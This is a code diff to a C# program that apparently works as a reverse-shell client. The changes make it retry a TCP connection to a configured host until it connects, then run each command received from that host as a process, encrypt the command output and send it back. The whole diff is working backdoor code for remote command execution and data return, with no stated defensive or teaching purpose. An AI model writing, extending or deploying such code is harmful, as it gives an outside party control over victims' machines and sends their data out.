@@ -27,9 +27,24 @@ namespace PR0T0TYP3
 			int port = Convert.ToInt32((String)dict.Value);
 
 			TcpClient tcpCli = new TcpClient();
-			tcpCli.Connect(ipAddress, port);
+			Console.WriteLine("Waiting for connection...");
 
-			//Add an Async so the client exe doesn't auto close later
+			while (true)
+			{
+				try
+				{
+					tcpCli.Connect(ipAddress, port);
+				}
+				catch
+				{
+					continue;
+				}
+
+				if (tcpCli.Connected)
+					break;
+			}
+
+			//Add an Async so the client exe doesn't auto close
 			while (true)
 			{
 				String dataRcved = DownloadData(tcpCli);
@@ -41,13 +56,22 @@ namespace PR0T0TYP3
 				startInfo.Arguments = dataRcved;
 				process.StartInfo = startInfo;
 				process.Start();
+
+				StringBuilder outputted = new StringBuilder();
+				while (!process.StandardOutput.EndOfStream)
+				{
+					outputted.Append(process.StandardOutput.ReadLine() + "\n");
+				}
+				byte[] output = encrypt(outputted.ToString());
+				NetworkStream netStream = tcpCli.GetStream();
+				netStream.Write(output, 0, output.Length);
 			}
 			
 		}
 
 		public static String DownloadData(TcpClient curClient)
 		{
-			Console.WriteLine("Receiving...");
+			Console.WriteLine("\nReceiving...");
 			String dataS = "";
 			NetworkStream stream = curClient.GetStream();
 			byte[] data = new byte[4096];
